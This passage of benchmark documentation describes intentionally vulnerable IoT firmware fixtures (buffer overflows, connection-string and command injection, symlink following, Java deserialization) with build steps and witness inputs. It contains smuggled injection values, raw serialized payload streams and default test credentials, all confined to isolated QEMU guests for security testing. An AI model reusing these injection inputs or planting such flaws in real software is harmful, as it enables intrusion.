**⚙️ Implementation.** Every supported device category has a thin
`<device>-cwe787-native-buffer-overflow` image recipe. It retains device
metadata but installs only `cwe787-native-buffer-overflow`, with no device
daemon or network listener. The installed normal and ASan binaries are both
compiled from `fixture-buffer-write.c`; the latter only makes the same
`configuration[index] = payload[index]` store observable. The one missing
check is `length <= sizeof(configuration)`: CWE-787 is the primary label,
CWE-20 is the contributing validation failure, and CWE-119 is the broader
category.

**✅ Runtime evidence.** The `router`/`qemuarm64` ASan-enabled image was built
with the normal Compose workflow and its exported root filesystem contained
both `/usr/bin/fixture-buffer-write` and
`/usr/bin/fixture-buffer-write-asan`, root-owned and mode `0755`. In QEMU, the
64-byte frame returned `OK 64 3072` with exit `0`; the 65-byte frame returned
exit `86` and ASan reported a global-buffer-overflow, one-byte write, and
`fixture-buffer-write.c:51` on two consecutive manual runs. This evidence is
limited to that built router/QEMU variant; the same shared package and image
pattern provide the fixture for the other device categories.

> ⚠️ **Disclaimer:** Intentionally insecure, isolated benchmark fixture only.
> The input is a local synthetic configuration frame; it starts no service,
> enables no networking, and is not an exploitation procedure. Do not deploy
> this configuration or reuse it outside the benchmark.

Source: [cwe787-native-buffer-overflow](../meta-iotbench/recipes-vulns/cwe787-native-buffer-overflow/).

<a id="native-connection-string-injection-cwe-20"></a>
<a id="test-11"></a>

## Test 11: Vulnerable C binaries — Connection String Injection — CWE-20

### Build, boot and manual testing

**What this tests.** The actual native C binary builds a SQLite `file:` URI
from a caller-controlled `cache` field and an intended fixed `mode=ro` suffix.
The input is a two-byte big-endian length followed by printable ASCII. The
fixture creates a new private synthetic database for every invocation; no
network service, existing database or external endpoint is involved.

**Build — host:**

Run from the repository root. The named scenario selects the fixture-only build
mode and its connection-fixture opt-in automatically.

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe020-native-connection-string
TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
```

**Boot — host:**

```bash
FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

This is a serial-only fixture: QEMU starts with no NIC. Log in with `root` /
`routeradmin`, then run the remaining commands in the guest console.

**Baseline — guest:**

```sh
printf '\000\007private' | \
  setpriv --reuid=65534 --regid=65534 --clear-groups --no-new-privs \
  /usr/bin/fixture-connection
echo "baseline_exit=$?"
```

Expected: the fixture notice, then
`OK readonly=1 marker=SYNTHETIC_CONNECTION_RESOURCE` and
`baseline_exit=0`. The normal `private` cache value leaves the intended
read-only SQLite connection in effect.

**Connection-string injection — guest:**

```sh
printf '\000\020private&mode=rw#' | \
  setpriv --reuid=65534 --regid=65534 --clear-groups --no-new-privs \
  /usr/bin/fixture-connection
echo "injected_exit=$?"
```

Expected: the same synthetic marker but
`OK readonly=0 marker=SYNTHETIC_CONNECTION_RESOURCE` and
`injected_exit=0`. `\000\020` declares the 16-byte value
`private&mode=rw#`; its `#` starts a URI fragment, so SQLite applies the
attacker-controlled `mode=rw` and ignores the intended trailing `&mode=ro`.

**Repeat control — guest:**

```sh
printf '\000\007private' | \
  setpriv --reuid=65534 --regid=65534 --clear-groups --no-new-privs \
  /usr/bin/fixture-connection
echo "repeat_baseline_exit=$?"
```

Expected: again `OK readonly=1 marker=SYNTHETIC_CONNECTION_RESOURCE` and
`repeat_baseline_exit=0`. Each process creates and removes its own private
database, so the result returns to the normal read-only state. Repeating the
injected command above consistently returns `readonly=0`.

### Scenario and scope

**⚙️ Implementation.** Every supported device category has a thin
`<device>-cwe020-native-connection-string` image recipe that installs only
`cwe020-native-connection-string` plus its device metadata. The executable's
data flow is `stdin` -> `read_cache()` -> `snprintf()` URI construction ->
`sqlite3_open_v2()` -> `sqlite3_db_readonly()`. The sole intentional defect is
missing exact validation/URI encoding of the `cache` field; the database path,
SQL query and Unix VFS are fixed. The helper rejects root execution, runs with
matching unprivileged IDs, enables `no_new_privs` and seccomp denial of socket,
connect and exec syscalls.

**✅ Runtime evidence.** On 2026-11-04, the `router`/`qemuarm64` image built and
exported successfully with the normal Compose workflow. Its compressed ext4
passed `zstd -t`; offline inspection found root-owned mode `0755`
`/usr/bin/fixture-connection` and its installed source/ground truth. In the
disposable serial-only QEMU guest, the manual baseline returned `readonly=1`,
the concrete injected field returned `readonly=0`, the baseline reset to
`readonly=1`, and a repeated injected field returned `readonly=0`; all four
commands exited 0. Runtime evidence is limited to this built router/QEMU
variant. The eleven recipe inclusions were inspected and share the same package
and fixture configuration.

> ⚠️ **Disclaimer:** Intentionally insecure, isolated benchmark fixture only.
> The input changes capability only for a newly created private SQLite database;
> it starts no service, reaches no network and provides no persistence or
> post-exploitation path. Do not deploy this configuration or reuse the input
> outside this benchmark.

Source: [cwe020-native-connection-string](../meta-iotbench/recipes-vulns/cwe020-native-connection-string/).

<a id="native-c-symbolic-link-following-cwe-61-and-cwe-59"></a>
<a id="test-12"></a>

## Test 12: Vulnerable C binaries — symbolic-link following — CWE-61/CWE-59

### Build, boot and manual testing

**What this tests.** The actual target C handler reads the fixed
`public.cfg` entry from a pinned `allowed/` directory. The existing
`isolate-path` manual entry copies only the two fixed synthetic resources into
a fresh unprivileged tmpfs namespace. Its concrete `ordinary` and `symlink`
arguments select either the ordinary file or the pre-established
`public.cfg -> ../sentinel.txt` entry before the C handler opens it. The
one-shot terminal entry then calls the same `retrieve()` sink as the Unix
socket service; it uses no Python client, network listener, or caller-selected
filename.

**Build — host:**

Run from the repository root. Selecting this scenario enables its own
fixture-only build configuration automatically.

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe061-native-symlink-following
TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
```

**Boot — host:**

```bash
FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

This is a serial-only fixture: QEMU starts with no NIC. Log in with `root` /
`routeradmin`, then run the remaining commands in the guest console.

**Ordinary-file baseline — guest:**

```sh
su -s /bin/sh iotsymlink -c '
root=$(mktemp -d /tmp/iotbench-symlink.XXXXXX) || exit 1
/usr/share/iotbench/native-symlink/bin/isolate-path --manual-request \
  /usr/share/iotbench/native-symlink "$root" ordinary
status=$?
rmdir "$root"
exit "$status"
'
echo "baseline_exit=$?"
```

Expected: `ENTRY ordinary public.cfg`, followed by `OK 39` and
`SYNTHETIC_CWE61_ORDINARY_CONFIGURATION`, then `baseline_exit=0`. The ordinary
entry is the allowed boundary condition.

**Pre-established symbolic-link witness and repeat — guest:**

```sh
for label in witness repeat; do
  su -s /bin/sh iotsymlink -c '
root=$(mktemp -d /tmp/iotbench-symlink.XXXXXX) || exit 1
/usr/share/iotbench/native-symlink/bin/isolate-path --manual-request \
  /usr/share/iotbench/native-symlink "$root" symlink
status=$?
rmdir "$root"
exit "$status"
'
  printf '%s_exit=%s\n' "$label" "$?"
done
```

Expected on both iterations: `ENTRY symlink public.cfg -> ../sentinel.txt`,
then `OK 30` and `SYNTHETIC_CWE61_SENTINEL_ONLY`, with exit `0`. The launcher
creates the link before the target C process starts, while the process pins
the parent directory. The vulnerable `openat()` lacks `O_NOFOLLOW`, so it
follows only that fixed final-component link and reads the synthetic sentinel.
Each invocation receives a new private tmpfs, so the repeated result confirms
that no guest or host state is retained.

### Scenario and scope

**⚙️ Implementation.** Every supported device category has a thin
`<device>-cwe061-native-symlink-following` image recipe that installs only
`cwe061-native-symlink-following` plus device metadata. Its static-PIE target
ELF remains executable after the existing launcher pivots into the minimal
tmpfs. The only intentional defect is omission of `O_NOFOLLOW` on the fixed
`public.cfg` final component; the corrected twin uses the same manual input
but refuses the link with `ERR DENIED`. The test never accepts a path from the
researcher and cannot reach files outside its disposable synthetic namespace.

**✅ Runtime evidence.** On 2026-11-04, the normal Compose build and export of
the `router`/`qemuarm64` vulnerable image succeeded. Its compressed ext4
passed `zstd -t`; offline inspection found the root-owned mode-`0755` target
ELF and fixture resources. In the disposable QEMU serial guest, the documented
`ordinary` request returned `OK 39` and the ordinary marker; two independent
`symlink` requests each returned `OK 30` and the sentinel with exit `0`. The
same router fixed twin built and booted successfully: its ordinary request
remained accepted, while its pre-established `symlink` request returned
`ERR DENIED`. No Python runner or network interface was used. Runtime evidence
is limited to these built router/QEMU images; the eleven thin recipes reuse the
same package and explicit fixture configuration.

> ⚠️ **Disclaimer:** Intentionally insecure, isolated benchmark fixture only.
> The link and both resources exist solely inside a fresh private tmpfs; no
> network service, persistence, external file, or exploitation chain is
> involved. Do not deploy this configuration or reuse its input outside this
> benchmark.

Source: [cwe061-native-symlink-following](../meta-iotbench/recipes-vulns/cwe061-native-symlink-following/).

<a id="test-13"></a>

## Test 13: Vulnerable Java JARs — command injection — CWE-78/CWE-77/CWE-20

### Build, boot and manual testing

**What this tests.** This fixture provides two deliberately narrow Java JARs.
Both require the `--fixture-test` argument, the
`IOTBENCH_ENABLE_JAVA_COMMAND_FIXTURE=1` opt-in, and a writable `/work`
directory owned by the unprivileged `javacommand` user. Their shared
intentional CWE-20 defect accepts any printable-ASCII `label` rather than the
intended `[A-Za-z0-9_-]` form. The CWE-78 variant concatenates that label into
a fixed `/bin/sh -c` command; the concrete witness below closes its quoted
argument and writes the fixed synthetic `os-marker.txt` marker. The CWE-77
variant sends the label to a tiny application command interpreter whose `;`
separator permits the fixed `mark` command and its synthetic
`app-marker.txt` file. Neither JAR starts a service or needs a network path.

**Build and boot the OS-command variant — host:**

Run from the repository root. Selecting this scenario enables only its own
fixture configuration automatically.

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe078-java-os-command-injection
TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

QEMU is serial-only and starts with no NIC. Log in with `root` / `routeradmin`.
In a fresh default QEMU snapshot, create the fixture's isolated working
directory; the JAR itself will run as `javacommand`.

```sh
mkdir /work
chown javacommand:javacommand /work
chmod 0700 /work
```

**CWE-78 baseline — guest:**

```sh
su -s /bin/sh javacommand -c 'cd /work && rm -f normal.txt os-marker.txt && printf "label=sensor_01\n" | env IOTBENCH_ENABLE_JAVA_COMMAND_FIXTURE=1 java -Xmx32m -XX:-UsePerfData -jar /usr/share/iotbench/java-command-fixture/fixture-os-command.jar --fixture-test && printf "normal=" && cat normal.txt && test ! -e os-marker.txt && printf "marker=absent\n"'
printf 'baseline_exit=%s\n' "$?"
```

Expected: `normal=sensor_01`, then `marker=absent` and `baseline_exit=0`.
The input is within the intended label boundary and creates no marker.

**CWE-78 witness — guest:**

```sh
su -s /bin/sh javacommand <<'EOF'
set -eu
cd /work
rm -f normal.txt os-marker.txt
printf "%s\n" "label=sensor' > normal.txt; printf 'JAVA_OS_MARKER\\n' > os-marker.txt; #" |
  env IOTBENCH_ENABLE_JAVA_COMMAND_FIXTURE=1 \
  java -Xmx32m -XX:-UsePerfData -jar \
  /usr/share/iotbench/java-command-fixture/fixture-os-command.jar --fixture-test
printf 'normal='
cat normal.txt
printf 'marker='
cat os-marker.txt
EOF
printf 'witness_exit=%s\n' "$?"
```

Expected: `normal=sensor`, `marker=JAVA_OS_MARKER`, and `witness_exit=0`.
The marker is produced by the JAR's intentionally concatenated shell command,
in `/work` only. For the reproducibility control, paste the same witness block
once more (it removes both files first): it must again print the same two
values and exit `0`.

**Build and boot the application-command variant — host:**

Quit the first guest with `Ctrl-A`, then `x`; the default QEMU disk is a
snapshot. Build and boot a fresh guest for the second JAR.

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe077-java-app-command-injection
TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

Log in with `root` / `routeradmin` and prepare its fresh `/work` directory:

```sh
mkdir /work
chown javacommand:javacommand /work
chmod 0700 /work
```

**CWE-77 baseline — guest:**

```sh
su -s /bin/sh javacommand -c 'cd /work && rm -f normal.txt app-marker.txt && printf "label=sensor_01\n" | env IOTBENCH_ENABLE_JAVA_COMMAND_FIXTURE=1 java -Xmx32m -XX:-UsePerfData -jar /usr/share/iotbench/java-command-fixture/fixture-app-command.jar --fixture-test && printf "normal=" && cat normal.txt && test ! -e app-marker.txt && printf "marker=absent\n"'
printf 'baseline_exit=%s\n' "$?"
```

Expected: `normal=sensor_01`, `marker=absent`, and `baseline_exit=0`.

**CWE-77 witness — guest:**

```sh
su -s /bin/sh javacommand <<'EOF'
set -eu
cd /work
rm -f normal.txt app-marker.txt
printf 'label=sensor;mark\n' |
  env IOTBENCH_ENABLE_JAVA_COMMAND_FIXTURE=1 \
  java -Xmx32m -XX:-UsePerfData -jar \
  /usr/share/iotbench/java-command-fixture/fixture-app-command.jar --fixture-test
printf 'normal='
cat normal.txt
printf 'marker='
cat app-marker.txt
EOF
printf 'witness_exit=%s\n' "$?"
```

Expected: `normal=sensor`, `marker=JAVA_APP_MARKER`, and `witness_exit=0`.
Here `mark` is an extra application-language statement, not an operating-system
command. Paste the same witness block once more for the reproducibility
control; it must produce the same output and exit `0` after its local cleanup.

### Scenario and scope

**⚙️ Implementation.** Each supported device category — `doorlock`,
`envsensor`, `healthmonitor`, `ipcamera`, `plc`, `router`, `smartbulb`,
`smarthub`, `smartplug`, `smartspeaker`, and `thermostat` — has one thin
`<device>-cwe078-java-os-command-injection` image and one thin
`<device>-cwe077-java-app-command-injection` image. Each installs only the
corresponding JAR fixture and device metadata. `FixtureRequest` enforces the
explicit argument, environment, working-directory, length, and ASCII gates;
its intentionally weak label grammar is the common input-validation defect.
Only `FixtureOsCommand` invokes `/bin/sh`; `FixtureAppCommand` implements the
separate application-command condition. The documented manual inputs write
only fixed markers in the unprivileged `/work` directory; no other target is
needed to observe either condition.

**✅ Runtime evidence.** On 2026-11-04, the normal Compose workflow built and
exported both `router`/`qemuarm64` images. Each compressed ext4 passed
`zstd -t`; offline ext4 inspection found the corresponding root-owned,
mode-`0644` JAR plus its source and ground-truth resources. In fresh
serial-only QEMU guests, each documented baseline returned
`normal=sensor_01` with no marker. Two independent CWE-78 witness executions
returned `normal=sensor` and `JAVA_OS_MARKER`; two independent CWE-77 witness
executions returned `normal=sensor` and `JAVA_APP_MARKER`; all runs exited
`0`. No Python runner, automatic test harness, network interface, or external
system was used. Runtime evidence is limited to the built router/QEMU images;
the eleven image recipes per variant reuse the inspected fixture package and
configuration.

> ⚠️ **Disclaimer:** Intentionally insecure, isolated benchmark fixture only.
> The concrete inputs write fixed synthetic markers in the disposable guest's
> `/work` directory; they start no service, access no network, provide no
> persistence, and are not for use outside this benchmark.

Source: [java-command-fixture](../meta-iotbench/recipes-vulns/java-command-fixture/).

<a id="test-14"></a>

## Test 14: Vulnerable Java JARs — deserialization — CWE-502/CWE-20

### Build, boot and manual testing

**What this tests.** The local JAR reads one Java serialization stream from
standard input. `FixtureData` is the only intended request type, but the
vulnerable image applies resource limits without a type allowlist before
`ObjectInputStream.readObject()`. The concrete `FixtureMarker` stream below
therefore runs its harmless `readObject()` callback, which increments only an
in-memory counter, before the later `instanceof FixtureData` check returns
`UNEXPECTED_TYPE`. The explicit `--show-events` option exposes that counter for
this benchmark observation; it neither writes a file nor starts a service.

**Build and boot — host:**

Run from the repository root. The selected scenario enables only its own
fixture build configuration.

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe502-java-deserialization
TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

This is a serial-only fixture: QEMU starts with no NIC or forwarded port. Log
in with `root` / `routeradmin`, then run the remaining commands in the guest
console. The two variables below are complete fixed Java serialization streams;
`printf '%b'` interprets their concrete octal bytes and needs no Python,
generator or test harness.

```sh
FIXTURE=/usr/share/iotbench/java-deserialization-fixture
NORMAL_STREAM='\254\355\000\005\163\162\000\060\157\162\147\056\151\157\164\142\145\156\143\150\056\146\151\170\164\165\162\145\056\144\145\163\145\162\151\141\154\151\172\141\164\151\157\156\056\106\151\170\164\165\162\145\104\141\164\141\000\000\000\000\000\000\000\001\002\000\002\111\000\007\162\145\141\144\151\156\147\114\000\006\163\145\156\163\157\162\164\000\022\114\152\141\166\141\057\154\141\156\147\057\123\164\162\151\156\147\073\170\160\000\000\000\027\164\000\011\163\145\156\163\157\162\137\060\061'
MARKER_STREAM='\254\355\000\005\163\162\000\062\157\162\147\056\151\157\164\142\145\156\143\150\056\146\151\170\164\165\162\145\056\144\145\163\145\162\151\141\154\151\172\141\164\151\157\156\056\106\151\170\164\165\162\145\115\141\162\153\145\162\000\000\000\000\000\000\000\001\002\000\000\170\160'
```

**Baseline — guest:**

```sh
printf '%b' "$NORMAL_STREAM" | \
  setpriv --reuid=992 --regid=992 --clear-groups \
  env IOTBENCH_ENABLE_JAVA_DESERIALIZATION_FIXTURE=1 \
  java -Xmx32m -XX:-UsePerfData -jar "$FIXTURE/fixture-deserialization.jar" \
  --fixture-test --show-events
printf 'baseline_exit=%s\n' "$?"
```

Expected: `OK sensor=sensor_01 reading=23`, `CALLBACK_EVENTS=0`, then
`baseline_exit=0`. This valid `FixtureData` request reaches the same
deserialization path but no marker callback.

**Callback witness — guest:**

```sh
printf '%b' "$MARKER_STREAM" | \
  setpriv --reuid=992 --regid=992 --clear-groups \
  env IOTBENCH_ENABLE_JAVA_DESERIALIZATION_FIXTURE=1 \
  java -Xmx32m -XX:-UsePerfData -jar "$FIXTURE/fixture-deserialization.jar" \
  --fixture-test --show-events
printf 'witness_exit=%s\n' "$?"
```

Expected: `UNEXPECTED_TYPE`, `CALLBACK_EVENTS=1`, then `witness_exit=2`.
The nonzero application status is the intentional late rejection, not a failed
test: the event count proves that the input class was reconstructed and its
callback ran first. Paste this same block once more; it must again print
`UNEXPECTED_TYPE`, `CALLBACK_EVENTS=1`, and `witness_exit=2`.

**Corrected allowlist control (optional, host and guest):** quit QEMU with
**Ctrl-A**, then **X**, build and boot the existing twin, log in again, and
reuse the same `MARKER_STREAM` definition from above.

```bash
FIRMWARE=router-cwe502-java-deserialization-fixed docker compose run --rm yocto
FIRMWARE=router-cwe502-java-deserialization-fixed ./scripts/run-qemu.sh
```

```sh
FIXTURE=/usr/share/iotbench/java-deserialization-fixture
MARKER_STREAM='\254\355\000\005\163\162\000\062\157\162\147\056\151\157\164\142\145\156\143\150\056\146\151\170\164\165\162\145\056\144\145\163\145\162\151\141\154\151\172\141\164\151\157\156\056\106\151\170\164\165\162\145\115\141\162\153\145\162\000\000\000\000\000\000\000\001\002\000\000\170\160'
printf '%b' "$MARKER_STREAM" | \
  setpriv --reuid=992 --regid=992 --clear-groups \
  env IOTBENCH_ENABLE_JAVA_DESERIALIZATION_FIXTURE=1 \
  java -Xmx32m -XX:-UsePerfData -jar "$FIXTURE/fixture-deserialization.jar" \
  --fixture-test --show-events
printf 'fixed_marker_exit=%s\n' "$?"
```

Expected: `FILTER_REJECTED`, `CALLBACK_EVENTS=0`, and
`fixed_marker_exit=2`. The corrected twin's allowlist rejects
`FixtureMarker` before its callback while keeping the normal `FixtureData`
baseline valid.

### Scenario and scope

**⚙️ Implementation.** Every supported device category — `doorlock`,
`envsensor`, `healthmonitor`, `ipcamera`, `plc`, `router`, `smartbulb`,
`smarthub`, `smartplug`, `smartspeaker`, and `thermostat` — has one thin
`<device>-cwe502-java-deserialization` image and an existing corrected twin.
The shared image include installs only the Java fixture and core boot packages,
copies device metadata, disables device daemons, and requires explicit fixture
mode. The source-to-observation flow is fixed: stdin → bounded byte array →
`ObjectInputStream.readObject()` → `FixtureMarker.readObject()` → late
`instanceof` rejection → `CALLBACK_EVENTS`. Resource bounds remain in place
(4096 bytes, depth 8, 32 references and array length 16); CWE-502 is the
missing type restriction at the reconstruction boundary, with CWE-20 as the
contributing input-validation error. The fixture establishes an unintended
synthetic callback only, not arbitrary code execution.

**✅ Runtime evidence.** On 2026-11-05, the normal Compose workflow built and
exported all eleven vulnerable `qemuarm64` images, plus both `router` variants.
Every vulnerable compressed ext4 artifact passed `zstd -t`; offline ext4
inspection found the matching shared `FixtureDeserialize.java` source and the
application JAR in each one. The two router artifacts additionally contained the
root-owned mode-`0644` application and test JARs, sources and ground-truth
resources. In fresh serial-only QEMU guests, the vulnerable JAR accepted the normal stream with
`CALLBACK_EVENTS=0`; two independent marker-stream executions returned
`UNEXPECTED_TYPE`, `CALLBACK_EVENTS=1`, and exit `2`. The corrected router twin
accepted the normal stream but returned `FILTER_REJECTED`,
`CALLBACK_EVENTS=0`, and exit `2` for the identical marker stream. No Python
runner, automatic test harness, network interface or external system was used.
Dynamic runtime evidence is limited to the built router/QEMU images; the artifact
checks establish package inclusion across the eleven thin device recipes.

> ⚠️ **Disclaimer:** Intentionally insecure, isolated benchmark fixture only.
> The two byte streams are synthetic local Java objects; their only observable
> side effect is an in-memory counter in the disposable guest. They provide no
> persistence, remote access or exploitation chain and must not be reused
> outside this benchmark.

Source: [cwe502-java-deserialization](../meta-iotbench/recipes-vulns/cwe502-java-deserialization/).

## Buffer Overflow esposto tramite service interface

> INTENTIONALLY INSECURE SYNTHETIC TEST FIXTURE — LOCAL SECURITY TESTING ONLY — NOT FOR DEPLOYMENT

### Scope and integration

**CWE-120: Buffer Copy without Checking Size of Input** is modeled by one
unchecked copy of a synthetic display label into a 32-byte stack buffer.
CWE-121 describes the stack destination of this same flaw; it is not a second
intentional vulnerability. The fixture performs a harmless in-memory operation
and returns `SYNTHETIC_LABEL_UPDATED` followed by a newline for valid short
requests. It does not execute commands or modify device state.

Every supported category uses the existing device profile and a separate image:

| Category / device keyword | Firmware fixture |
| --- | --- |
| Network gateway / `router` | `router-cwe120-service-buffer-overflow` |
| Surveillance camera / `ipcamera` | `ipcamera-cwe120-service-buffer-overflow` |
| Energy management / `smartplug` | `smartplug-cwe120-service-buffer-overflow` |
| Climate control / `thermostat` | `thermostat-cwe120-service-buffer-overflow` |
| Industrial gateway / `plc` | `plc-cwe120-service-buffer-overflow` |
| Lighting / `smartbulb` | `smartbulb-cwe120-service-buffer-overflow` |
| Controller / `smarthub` | `smarthub-cwe120-service-buffer-overflow` |
| Environmental sensor / `envsensor` | `envsensor-cwe120-service-buffer-overflow` |
| Audio assistant / `smartspeaker` | `smartspeaker-cwe120-service-buffer-overflow` |
| Health monitor / `healthmonitor` | `healthmonitor-cwe120-service-buffer-overflow` |
| Access control / `doorlock` | `doorlock-cwe120-service-buffer-overflow` |

Recipes retain the established name
`meta-iotbench/recipes-images/iotbench-<firmware fixture>.bb`, require
`iotbench-service-buffer-overflow.inc`, and select only
`cwe120-service-buffer-overflow` as `IOTBENCH_VULN_INSTALL`. The catalog build
script already discovers these eleven recipes. Sources, service unit, tests,
NOTICE and ground truth are in
`meta-iotbench/recipes-vulns/cwe120-service-buffer-overflow/files/`.
The recipe installs `/usr/bin/fixture-label-service`, the separate diagnostic
executable `fixture-label-service-asan`, and source/test assets under
`/usr/share/iotbench/service-buffer-overflow/`.

### Interface, data flow and expected static findings

The one-request native C service accepts **AF_UNIX / SOCK_STREAM** at
`/run/iotbench-label/service.sock`; there is no TCP/UDP listener. Each connection
first receives a readiness byte `0x01` from the server, synchronizing acceptance
before the client's half-close. The client then sends a two-byte unsigned
big-endian byte count, exactly that many printable
ASCII bytes (1 through 1024), then the client half-closes its write side.
Truncated headers/bodies, trailing bytes, zero or excessive protocol length,
embedded NUL, control characters and non-ASCII bytes are rejected with exit 2
and no response. Socket receives handle partial reads and EINTR.

The input path in `fixture-label-service.c` is:

```text
recv -> receive_exact -> field[1025] (line 61)
     -> validated protocol length and printable ASCII; append NUL
     -> handle_label_request(field, length) (line 73)
     -> volatile char label[32] (line 38)
     -> for i = 0..length inclusive: label[i] = field[i] (line 43)
```

The sole missing check is `length < sizeof(label)` before the copy, including
space for its terminating NUL. A 31-byte field fits; a 32-byte field writes its
NUL one byte past the destination. Longer protocol-valid fields reach the same
flaw. The 1024-byte framing limit protects the receive buffer but does not
protect the smaller destination. Volatile keeps these byte writes observable
in optimized binaries. No compiler hardening flags are removed to expose them.

Expected static finding: externally supplied socket data and its length reach
an unchecked destination index in `handle_label_request`, with a possible
out-of-bounds stack write (CWE-120, additionally classifiable as CWE-121).
Tools should trace the receive/parser/handler path and distinguish the protocol
size check from a destination-capacity check. `ground-truth.json` records exact
source locations; the host runner checks them against the source. Actual
analyzer coverage and diagnostic wording depend on the tool; no particular
static analyzer's detection is asserted by the regression. An analyzer that only
flags unsafe library calls needs additional loop/bounds analysis for this copy.
Source-based analysis must use the recipe's compile configuration, including
`-DIOTBENCH_CWE120_FIXTURE=1`, to satisfy the intentional build guard.

### Explicit test build and automated validation

From the repository root, run the isolated host regression as an unprivileged
user with a C compiler supporting AddressSanitizer:

```bash
python3 scripts/test-service-buffer-overflow.py --local
# Linux alternative using the existing builder (no downloads/network needed):
docker compose run --rm yocto python3 /scripts/test-service-buffer-overflow.py --local
```

This builds temporary native and ASan executables with optimization, Fortify,
stack protection and PIE, adding RELRO/NOW on Linux. It verifies ordinary
compilation without the fixture definition fails. Normal label lengths 1, 21
and 31 succeed on both builds, including fragmented sends. Malformed frames
are rejected without sanitizer errors. Lengths 32, 104 and 1024 run **only on
the ASan build** and must terminate unsuccessfully with
`AddressSanitizer: stack-buffer-overflow`, `WRITE of size 1`, the label object
and `handle_label_request` in the report, and no success response. Absolute
addresses and process IDs vary with ASLR and are not test assertions.

A temporary corrected control inserts the missing capacity check and repeats
the socket tests: oversized labels must now be rejected without an ASan error.
It is deleted after testing and never replaces the vulnerable firmware source.
Runtime flag/environment omission must also be rejected before socket setup.
Test completion prints `PASS` assertions and returns 0.

Firmware builds require an explicit opt-in; the package is skipped otherwise:

```bash
IOTBENCH_ENABLE_CWE120_FIXTURE=1 \
  FIRMWARE=router-cwe120-service-buffer-overflow docker compose run --rm yocto
python3 scripts/test-service-buffer-overflow.py --device router
```

Compose passes this single opt-in to BitBake. For direct BitBake use, set
`IOTBENCH_ENABLE_CWE120_FIXTURE = "1"` in the isolated build's `local.conf`.
The recipe builds both ordinary and ASan executables from identical C source,
preserving inherited `${CPPFLAGS}`, `${CFLAGS}` and `${LDFLAGS}`. Artifacts
export to `deploy-images/<firmware fixture>/<machine>/`; `YOCTO_MACHINE`
selects the architecture. ASan runtime availability is required for that target.

Build and test every supported device:

```bash
for recipe in meta-iotbench/recipes-images/iotbench-*-cwe120-service-buffer-overflow.bb; do
    firmware=$(basename "$recipe" .bb)
    IOTBENCH_ENABLE_CWE120_FIXTURE=1 FIRMWARE="${firmware#iotbench-}" \
      docker compose run --rm yocto || exit 1
done
python3 scripts/test-service-buffer-overflow.py --all
```

For manual guest validation, boot with
`FIRMWARE=router-cwe120-service-buffer-overflow ./scripts/run-qemu.sh`, log in
using the existing synthetic serial-console credentials, and run
`sh /usr/share/iotbench/service-buffer-overflow/test-guest.sh router`.
The script checks the fixture marker, device identity, executable permissions
and disabled/inactive unit, starts the native unit for one **normal** request,
then runs the socket/ASan regression unprivileged inside a bounded systemd unit.
The host `--device` / `--all` modes automate this in disposable QEMU snapshots
and save `validation-console.log` beside each exported image.

### Isolation safeguards and limitations

Ordinary firmware configurations cannot build this package. The C source also
requires `IOTBENCH_CWE120_FIXTURE=1` at compilation. Startup requires both
`--fixture-test` and environment `IOTBENCH_CWE120_FIXTURE=1`, and refuses UID 0.
The disabled-by-default systemd unit additionally requires the gated recipe's
`/etc/iotbench/cwe120-fixture-enabled` marker. A normal binary invocation does
not start a listener. These are explicit research configuration guards, not a
security boundary against an administrator intentionally enabling the fixture.

The service runs as nobody/nogroup with an owner-only runtime directory and
socket, no new privileges, AF_UNIX restriction, private network/tmp, read-only
system/home restrictions, core suppression and CPU/memory/time/task limits.
It never removes a pre-existing socket path. The QEMU launcher disables the
network adapter entirely for these eleven fixtures; built-in device profiles
remain available for firmware analysis. The host tests use private temporary
directories and Unix sockets, suppress cores, enforce process timeouts and
never send oversized inputs to the ordinary executable. The service handles
one request then exits; each case starts a fresh process.

ASan changes stack layout and requires substantial virtual address space, so
guest resident-memory limits use cgroups rather than `RLIMIT_AS`. Stack
canaries, ASLR, NX and other normal hardening are retained. Production use is
unsupported. The benchmark demonstrates memory-safety detection only, with no
exploit, code-execution assertion, privilege change or persistent application
state. Target architectures lacking ASan support cannot run the instrumented
test without supplying a supported toolchain/runtime.

### Completed validation

**Verified 2026-10-22:** macOS/Apple Clang and Linux/GCC host regressions passed,
including the corrected temporary control. Three consecutive macOS runs passed
after the acceptance handshake was added; the final Linux run used a container
with networking disabled. All eleven `qemuarm64` images built/exported with
Yocto packaging QA enabled and passed their guest regressions: disabled initial
service, explicit normal request, unprivileged socket tests, valid 31-byte
boundary, malformed-frame rejection, and ASan-confirmed out-of-bounds writes for
32-, 104- and 1024-byte labels. Manifest checks confirmed the matching device
profile, ASan runtime and sole CWE-120 vulnerability package in every image.
The exported native/ASan ELF pair was also checked for PIE, RELRO/NOW,
non-executable stack and stack canaries. A separate ordinary configuration
confirmed BitBake skips the fixture without its opt-in.

Each image directory contains `validation-console.log` and `rootfs.manifest`.
Shared build, host-regression, manifest and opt-in evidence is saved under
`deploy-images/router-cwe120-service-buffer-overflow/qemuarm64/` as
`validation-build-all.log`, `validation-runtime-all.log`,
`validation-local-macos.log`, `validation-local-linux.log`,
`validation-manifests.log` and `validation-build-gate.log`.
Other target architectures were not built or boot-tested.

## Weak Cipher: 3DES Device Backups

### Build, boot and manual testing

**What this tests.** Backups use 3DES-CBC with a fixed key and IV embedded in the
firmware. This test shows the algorithm used and the repeatability of encryption.

